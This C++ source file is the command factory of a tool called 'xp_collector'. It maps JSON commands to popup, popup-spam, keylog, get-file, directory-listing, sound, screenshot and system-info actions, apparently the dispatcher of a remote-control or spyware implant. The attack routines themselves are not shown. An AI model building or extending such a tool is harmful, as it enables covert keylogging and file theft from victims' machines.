#include "Commands/CommandFactory.h"

#include "DirListCommand.h"
#include "GetFileCommand.h"
#include "PlaySoundCommand.h"
#include "Commands/PopupCommand.h"
#include "Commands/KeyLogCommand.h"
using namespace xp_collector;

std::unique_ptr<BasicCommand> CommandFactory::create(const json& command)
{
	const auto& command_id = command["command_id"];
	const auto command_type = ct_from_string(command["command_type"]);
	switch (auto basic = std::make_unique<BasicCommand>(command_id, command_type); basic->get_command_type()) {
	case CommandType::Popup:
	case CommandType::PopupSpam:
		return std::make_unique<PopupCommand>(command_id, command_type, command["parameters"]["message"]);
	case CommandType::KeyLog:
		return std::make_unique<KeyLogCommand>(command_id, command_type, command["parameters"]["duration"]);
	case CommandType::GetFile:
		return std::make_unique<GetFileCommand>(command_id, command_type, command["parameters"]["path"]);
	case CommandType::DirList:
		return std::make_unique<DirListCommand>(command_id, command_type, command["parameters"]["path"],
		                                        command["parameters"].contains("depth")
			                                        ? static_cast<unsigned int>(command["parameters"]["depth"])
			                                        : 1,
		                                        command["parameters"]["tree"]
		);
	case CommandType::PlaySoundCommand:
		return std::make_unique<PlaySoundCommand>(command_id, command_type, command["parameters"]["sound_buffer"]);

	// Commands with the BasicCommand structure go here, I.E. commands that receive no parameters
	case CommandType::Screenshot:
	case CommandType::GetSystemInfo:
	default:
		return std::move(basic);
	}
}
